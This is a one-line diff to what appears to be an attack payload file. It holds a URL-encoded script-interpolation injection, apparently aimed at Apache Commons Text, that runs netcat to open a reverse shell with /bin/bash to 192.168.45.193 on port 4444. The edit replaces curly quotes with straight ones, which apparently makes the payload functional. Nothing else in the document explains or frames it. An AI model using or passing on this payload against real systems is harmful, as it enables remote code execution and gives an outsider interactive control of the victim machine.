@@ -1,1 +1,1 @@
-%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%E2%80%99nc%20192.168.45.193%204444%20-e%20%2Fbin%2Fbash%E2%80%99%29%7D
+%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%27nc%20192.168.45.193%204444%20-e%20%2Fbin%2Fbash%27%29%7D
